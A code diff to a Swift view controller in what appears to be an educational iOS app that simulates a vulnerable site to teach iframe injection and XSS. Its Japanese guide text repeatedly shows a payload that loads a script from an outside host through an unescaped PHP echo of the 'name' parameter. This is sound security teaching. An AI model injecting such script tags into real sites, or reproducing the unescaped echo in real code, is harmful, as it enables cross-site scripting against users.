@@ -30,8 +30,8 @@ class IFrameInjectionUnsafeWebSimulatorViewController: WebSimulatorViewControlle
         welcomeLabel.text = "ようこそ脆弱株式会社へ"
         nameLabel.text = "さん"
         nameLabel.set(
-            code: "<p><script src=\"http://www.trap.cp.jp/iframe_injection.js\"></script>さん</p>",
-            language: .html
+            code: "<p><?php echo $_GET[\"name\"]; ?>さん</p>",
+            language: .php
         )
         feedbackIFrame.frame.size = CGSize(width: 320, height: 320)
         feedbackIFrame.set(
@@ -54,7 +54,7 @@ class IFrameInjectionUnsafeWebSimulatorViewController: WebSimulatorViewControlle
         appendGuideSection([
             GuideText(text: "この赤枠で囲まれたリンクをタップすると脆弱なWebサイトに遷移します。\nリンクの下に表示されたコードを見てみましょう。"),
             GuideText(
-                text: "脆弱なWebサイトに遷移する際、GETリクエストのnameパラメータには<script src=http://www.trap.cp.jp/iframe_injection.js></script>が設定されています。",
+                text: "脆弱なWebサイトに遷移する際、GETリクエストのnameパラメータには「<script src=http://www.trap.cp.jp/iframe_injection.js></script>」が設定されています。",
                 programingLanguages: [.html]
             ),
             GuideText(text: "このnameの値をエスケープせずに直接表示することによって攻撃者のスクリプトが実行されます。"),
@@ -89,8 +89,8 @@ class IFrameInjectionUnsafeWebSimulatorViewController: WebSimulatorViewControlle
             ])
         appendGuideSection([
             GuideText(
-                text: "この赤枠で囲まれた<p>要素には本来以下のコードでユーザの名前を表示しようとしていました。\n<p><?php echo $_GET[\"name\"]; ?>さん</p>\nしかし、本来の意図とは違って実際に実行されたのは<p>要素の下に示したコードです。",
-                programingLanguages: [.html, .php]
+                text: "この赤枠で囲まれた<p>要素には本来<p>要素の下に示したコードでユーザの名前を表示しようとしていました。\nしかし、本来の意図とは違って実際に実行されたのは以下のコードです。\n<p><script src=\"http://www.trap.cp.jp/iframe_injection.js\"></script>さん</p>",
+                programingLanguages: [.html]
             ),
             GuideText(
                 text: "nameに設定された値をエスケープせずに表示した結果、\n「<p><?php echo <script src=http://www.trap.cp.jp/iframe_injection.js></script>; ?>さん</p>」というコードが実行され攻撃者の用意したスクリプトが読み込まれてしまいました。",
@@ -129,52 +129,6 @@ class IFrameInjectionUnsafeWebSimulatorViewController: WebSimulatorViewControlle
         guideMessageCollectionView.scrollToItem(at: IndexPath(item: 0, section: 0), at: .left, animated: false)
         showGuideMessageCollectionView()
     }
-    
-//    private func startGuide2() {
-//        //endGuideHandler = guide2_1
-//        appendGuideText(, programingLanguages: nil)
-//        //setGuideText()
-//        showGuideMessageCollectionView(completion: nil)
-//    }
-//
-//    private func guide2_1() {
-//        //endGuideHandler = guide2_2
-//        appendGuideText(, programingLanguages: .html, .php)
-//        appendGuideText(, programingLanguages: .php, .html)
-//        //setGuideText()
-//        focus(on: nameLabel)
-//    }
-//
-//    private func guide2_2() {
-//        //endGuideHandler = guide2_3
-//    appendGuideText(, programingLanguages: .html)
-//        //setGuideText()
-//        unfocus(elementView: nameLabel)
-//        focus(on: feedbackIFrame)
-//    }
-
-//    private func guide2_3() {
-//        //endGuideHandler = guide2_4
-//    appendGuideText(, programingLanguages: nil)
-//    appendGuideText(, programingLanguages: nil)
-//        appendGuideText(, programingLanguages: nil)
-//        //setGuideText()
-//        unfocus(elementView: feedbackIFrame)
-//        focus(on: sessIdLabel)
-//    }
-//
-//    private func guide2_4() {
-//        //endGuideHandler = guide2_5
-//    appendGuideText(, programingLanguages: nil)
-//        //setGuideText()
-//        unfocus(elementView: sessIdLabel)
-//    }
-
-//    private func guide2_5() {
-//        hideGuideTextView() {
-//            self.presentingViewController?.presentingViewController?.dismiss(animated: true, completion: nil)
-//        }
-//    }
     
     
     @objc
